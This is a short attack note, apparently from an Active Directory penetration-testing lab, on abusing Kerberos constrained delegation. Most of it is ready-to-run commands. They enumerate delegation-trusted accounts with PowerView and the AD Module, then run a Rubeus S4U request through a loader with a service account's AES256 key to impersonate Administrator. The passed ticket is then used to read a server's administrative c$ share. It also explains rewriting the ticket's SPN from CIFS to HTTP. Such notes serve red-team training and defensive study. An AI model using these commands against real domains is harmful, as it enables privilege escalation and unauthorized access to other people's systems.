To abuse constrained delegation in above scenario, we need to have access to the websvc account. If we have access to that account, it is possible to access the services listed in `msDS-AllowedToDelegateTo` of the `websvc` (web service on web server) account as **ANY user**

Find users and computers with constrained delegation enabled (PowerView + AD Module)
```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne
"$null"} -Properties msDS-AllowedToDelegateTo
```

**COMPROMISE THE WEB SERVICE ACCOUNT AND RUN THE FOLLOWING AS IT**

Request a `TGT` and `TGS` and impersonate any user
```powershell
.\Loader.exe -path .\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
```

Test
```powershell
dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

 
> [!NOTE] **NOTE**
> You can edit what services the machine/user account can access if you have `GenericAll/Write` rights to the first hop
> 
> **THE SPN VALUE IN THE TGS IS CLEAR-TEXT WHICH MEANS THAT WE CAN CHANGE THE ALLOWED `CIFS/dcorp-mssql.dollarcorp.moneycorp.local` TO `HTTP/dcorp-mssql.dollarcorp.moneycorp.local` IF WE WANTED TO** 



